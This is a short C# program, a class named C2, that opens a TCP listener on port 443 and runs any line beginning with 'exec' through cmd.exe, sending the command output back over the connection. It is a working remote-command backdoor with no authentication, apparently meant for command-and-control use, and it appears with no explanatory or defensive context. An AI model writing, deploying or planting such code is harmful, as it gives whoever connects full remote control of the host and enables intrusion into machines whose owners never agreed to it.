using System;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using System.IO;
using System.Threading;

class C2 {
    static void Main() {
        TcpListener server = new TcpListener(IPAddress.Any, 443);
        server.Start();
        while (true) {
            TcpClient client = server.AcceptTcpClient();
            NetworkStream ns = client.GetStream();
            StreamReader sr = new StreamReader(ns);
            string cmd = sr.ReadLine();
            if (cmd != null && cmd.StartsWith("exec ")) {
                Process p = new Process();
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.Arguments = "/c " + cmd.Substring(5);
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.UseShellExecute = false;
                p.Start();
                string output = p.StandardOutput.ReadToEnd();
                byte[] data = System.Text.Encoding.UTF8.GetBytes(output);
                ns.Write(data, 0, data.Length);
            }
            client.Close();
        }
    }
}
